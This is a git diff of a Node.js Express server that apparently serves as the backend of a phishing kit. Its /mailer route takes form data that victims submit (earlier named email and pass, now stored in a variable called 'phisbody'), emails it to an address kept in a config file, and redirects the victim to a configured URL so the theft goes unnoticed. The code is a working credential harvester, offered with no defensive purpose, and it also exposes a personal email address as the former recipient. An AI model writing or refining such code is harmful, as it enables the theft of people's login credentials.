@@ -4,6 +4,7 @@ const path = require('path');
 const nodemailer = require('nodemailer');
 const { getMaxListeners } = require('process');
 require('dotenv').config();
+const url = require('./url.json')
 
 const PORT = process.env.PORT || 2020
 
@@ -23,7 +24,7 @@ app.get("/", (req, res) => {
 })
 
 app.post("/mailer", (req, res) => {
-    const { email, pass } = req.body
+    const phisbody = req.body
     console.log("Yes")
     
     let transporter = nodemailer.createTransport({
@@ -40,12 +41,12 @@ app.post("/mailer", (req, res) => {
         }
     });
 
+    console.log(url.mail);
     let mailOptions = {
         from: '"Tera Chacha" <your@email.com>', // sender address
-        to: "addityadd@gmail.com", // list of receivers
+        to: `${url.mail}`, // list of receivers
         subject: 'Email', // Subject line
-        text: `Email: ${email}\nPass: ${pass}`, // plain text body
-        //html: output // html body
+        text: `${phisbody}`, // plain text body
     };
     
     transporter.sendMail(mailOptions, (error, info) => {
@@ -55,7 +56,7 @@ app.post("/mailer", (req, res) => {
         console.log('Message sent: %s', info.messageId);
     });
 
-    res.send("LMAO")
+    res.redirect(url.url)
 
 })
 
